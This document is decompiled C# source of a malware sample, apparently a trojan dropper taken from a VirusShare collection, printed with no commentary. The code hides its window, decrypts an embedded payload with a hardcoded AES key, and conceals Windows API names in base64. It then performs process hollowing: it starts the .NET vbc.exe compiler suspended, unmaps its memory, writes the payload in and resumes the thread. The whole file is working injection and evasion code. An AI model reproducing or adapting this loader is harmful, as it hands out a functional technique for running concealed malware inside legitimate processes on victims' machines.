// Decompiled with JetBrains decompiler
// Type: Program.Main
// Assembly: dark3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 117575DF-396A-4982-9090-1A93CBAE0CF0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Injector.ncy-411db2d018350eabd852d6eae5277db612f9c54d1dc7e1a5544932b438102dd9.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Program
{
  public class Main : Form
  {
    private IContainer Components;

    [STAThread]
    public static void Main() => Application.Run((Form) new Program.Main());

    public Main()
    {
      this.Load += new EventHandler(this.Main_Load);
      Application.EnableVisualStyles();
      this.InitializeComponent();
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1, 1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Name = nameof (Main);
      this.Text = nameof (Main);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    protected override void Dispose(bool Disposing)
    {
      if (Disposing && this.Components != null)
        this.Components.Dispose();
      base.Dispose(Disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public T qsAIOXZ2Vfu4uBLCc<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(Program.Main.GetProcAddress(Program.Main.LoadLibraryA(ref name), ref method), typeof (T));

    public bool qpuBCHG8q4zUfGHaGF7(byte[] qLcTRCCaTrcmXSysREIwM, string qXWivu25ih2lZZMiF)
    {
      Program.Main.qLLOXO1OoLpQelLO91JD lloxO1OoLpQelLo91Jd = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qLLOXO1OoLpQelLO91JD>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
      Program.Main.qOoH2TMqSPLBhV6he ooH2TmqSplBhV6he = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qOoH2TMqSPLBhV6he>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
      Program.Main.qBlO5WFKdvRiyBkvIko o5WfKdvRiyBkvIko = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qBlO5WFKdvRiyBkvIko>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
      Program.Main.qWtawpG2QxUvJ5Hv3yFTi wtawpG2QxUvJ5Hv3yFti = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qWtawpG2QxUvJ5Hv3yFTi>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
      Program.Main.qQPCiJbNnR1KzZ5wDy qpCiJbNnR1KzZ5wDy = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qQPCiJbNnR1KzZ5wDy>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
      Program.Main.qfO4wNeOzTPrGeM2MN o4wNeOzTprGeM2Mn = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qfO4wNeOzTPrGeM2MN>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
      Program.Main.qnjOfvG9CsFWbe4VqN qnjOfvG9CsFwbe4VqN = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qnjOfvG9CsFWbe4VqN>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
      Program.Main.qnTwxkpeQK7F3H2QD qnTwxkpeQk7F3H2Qd = this.qsAIOXZ2Vfu4uBLCc<Program.Main.qnTwxkpeQK7F3H2QD>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
      bool flag;
      try
      {
        IntPtr zero1 = IntPtr.Zero;
        IntPtr[] q8DHKhBnZIuS8Iija7 = new IntPtr[4];
        byte[] qAzdpVv7QumPlD7KY7AW = new byte[68];
        int int32_1 = BitConverter.ToInt32(qLcTRCCaTrcmXSysREIwM, 60);
        int int16 = (int) BitConverter.ToInt16(qLcTRCCaTrcmXSysREIwM, checked (int32_1 + 6));
        IntPtr qVWNU6m3XlR2bgz2HDP = new IntPtr(BitConverter.ToInt32(qLcTRCCaTrcmXSysREIwM, checked (int32_1 + 84)));
        if (lloxO1OoLpQelLo91Jd((string) null, new StringBuilder(qXWivu25ih2lZZMiF), zero1, zero1, false, 4, zero1, (string) null, qAzdpVv7QumPlD7KY7AW, q8DHKhBnZIuS8Iija7))
        {
          uint[] numArray1 = new uint[179];
          numArray1[0] = 65538U;
          if (ooH2TmqSplBhV6he(q8DHKhBnZIuS8Iija7[1], numArray1))
          {
            IntPtr qnTLDlFEb4gUAs9jo = new IntPtr(checked ((long) numArray1[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            IntPtr qbG8BQPofmdVrwUvf = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (o5WfKdvRiyBkvIko(q8DHKhBnZIuS8Iija7[0], qnTLDlFEb4gUAs9jo, ref zero2, (int) qbG8BQPofmdVrwUvf, ref zero3) && qnTwxkpeQk7F3H2Qd(q8DHKhBnZIuS8Iija7[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(qLcTRCCaTrcmXSysREIwM, checked (int32_1 + 52)));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(qLcTRCCaTrcmXSysREIwM, checked (int32_1 + 80)));
              IntPtr qlFOT9CavyCjf6usUQ8jw = wtawpG2QxUvJ5Hv3yFti(q8DHKhBnZIuS8Iija7[0], num1, num2, 12288, 64);
              int int32_2 = qlFOT9CavyCjf6usUQ8jw.ToInt32();
              int qBUBLEeEDuAVQU7ERO;
              int num3 = qpCiJbNnR1KzZ5wDy(q8DHKhBnZIuS8Iija7[0], qlFOT9CavyCjf6usUQ8jw, qLcTRCCaTrcmXSysREIwM, checked ((uint) (int) qVWNU6m3XlR2bgz2HDP), qBUBLEeEDuAVQU7ERO) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) qLcTRCCaTrcmXSysREIwM, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                byte[] numArray2 = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) qLcTRCCaTrcmXSysREIwM, dst[5], (Array) numArray2, 0, numArray2.Length);
                num2 = new IntPtr(checked (int32_2 + dst[3]));
                num1 = new IntPtr(numArray2.Length);
                int num6 = qpCiJbNnR1KzZ5wDy(q8DHKhBnZIuS8Iija7[0], num2, numArray2, checked ((uint) (int) num1), qBUBLEeEDuAVQU7ERO) ? 1 : 0;
                checked { ++num5; }
              }
              num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
              num1 = new IntPtr(4);
              int num7 = qpCiJbNnR1KzZ5wDy(q8DHKhBnZIuS8Iija7[0], num2, BitConverter.GetBytes(qlFOT9CavyCjf6usUQ8jw.ToInt32()), checked ((uint) (int) num1), qBUBLEeEDuAVQU7ERO) ? 1 : 0;
              numArray1[44] = checked ((uint) (qlFOT9CavyCjf6usUQ8jw.ToInt32() + BitConverter.ToInt32(qLcTRCCaTrcmXSysREIwM, int32_1 + 40)));
              int num8 = o4wNeOzTprGeM2Mn(q8DHKhBnZIuS8Iija7[1], numArray1) ? 1 : 0;
            }
          }
          int num = (int) qnjOfvG9CsFwbe4VqN(q8DHKhBnZIuS8Iija7[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_11;
      }
      flag = true;
label_11:
      return flag;
    }

    private void Main_Load(object sender, EventArgs e)
    {
      RuntimeHelpers.GetObjectValue(My.Resources.Resources.ResourceManager.GetObject("glavni"));
      this.qpuBCHG8q4zUfGHaGF7(this.qp5bbZDrvrJsvE75Q6hV7(My.Resources.Resources.glavni), Encoding.UTF8.GetString(Convert.FromBase64String("QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2Mi4wLjUwNzI3XHZiYy5leGU=")));
      this.Close();
    }

    public byte[] qp5bbZDrvrJsvE75Q6hV7(byte[] qCSm5MVfOrtHXeNIN6Z)
    {
      using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
      {
        rijndaelManaged.IV = new byte[16]
        {
          (byte) 101,
          (byte) 42,
          (byte) 10,
          (byte) 218,
          (byte) 73,
          (byte) 206,
          (byte) 116,
          (byte) 78,
          (byte) 176,
          (byte) 15,
          (byte) 175,
          (byte) 25,
          (byte) 194,
          (byte) 155,
          (byte) 113,
          (byte) 118
        };
        rijndaelManaged.Key = new byte[16]
        {
          (byte) 118,
          (byte) 113,
          (byte) 155,
          (byte) 194,
          (byte) 25,
          (byte) 175,
          (byte) 15,
          (byte) 176,
          (byte) 78,
          (byte) 116,
          (byte) 206,
          (byte) 73,
          (byte) 218,
          (byte) 10,
          (byte) 42,
          (byte) 101
        };
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(qCSm5MVfOrtHXeNIN6Z, 0, qCSm5MVfOrtHXeNIN6Z.Length);
      }
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qLLOXO1OoLpQelLO91JD(
      string qIBxcn7K7QQNsywfQTzk,
      StringBuilder qyJyvZCjj541nvdr2P,
      IntPtr qAbHyHNyGfzgI4WGjv1R,
      IntPtr qNDHWeUPmBi7x1NT3AqwT,
      [MarshalAs(UnmanagedType.Bool)] bool q1Oseb9mYuNdnSM8K,
      int qjoh31zo3Hz6XGvM84,
      IntPtr qrTmGUpHJkX6h8UsvL2ha,
      string qEeoJ4E8WEcmJ24dB,
      byte[] qAzdpVv7QumPlD7KY7AW,
      IntPtr[] q8DHKhBnZIuS8Iija7);

    public delegate bool qQPCiJbNnR1KzZ5wDy(
      IntPtr qnP7RODs1LHuKmGmBdv3,
      IntPtr qlFOT9CavyCjf6usUQ8jw,
      byte[] qHrfHW8W3kyDucyXqE,
      uint qVWNU6m3XlR2bgz2HDP,
      int qBUBLEeEDuAVQU7ERO);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qBlO5WFKdvRiyBkvIko(
      IntPtr q8DjBTvXqbCxafzxv,
      IntPtr qnTLDlFEb4gUAs9jo,
      ref IntPtr qLit9YQSxyvBFa3iUtvJ,
      int qbG8BQPofmdVrwUvf,
      ref IntPtr qrFtuk8kFYLcmruDPt);

    public delegate IntPtr qWtawpG2QxUvJ5Hv3yFTi(
      IntPtr qz1lZAOwmkGmfMfZfMh,
      IntPtr qM8kOC7lUqhZMw6A5Dsj,
      IntPtr qVNkAEGAFAPHi1EZR,
      int qlUIkwwpXBnjhk2wPo7wJ,
      int quuvF6QPn9OQiixGKNXV);

    public delegate uint qnTwxkpeQK7F3H2QD(IntPtr q8qBSslf9TlXE6JJY, IntPtr qVgBbcKppBn8E4iXsV);

    public delegate uint qnjOfvG9CsFWbe4VqN(IntPtr qrpjOpln5iPXSFU4gq);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qOoH2TMqSPLBhV6he(
      IntPtr qHGshVenoMnK64yXID8nT,
      uint[] q88Q3qBAXTHIVu4CzLMDl);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool qfO4wNeOzTPrGeM2MN(IntPtr qS7uJHaJ1CBczaR7flrw, uint[] qTCKcMJ3izBTBz47udc);
  }
}
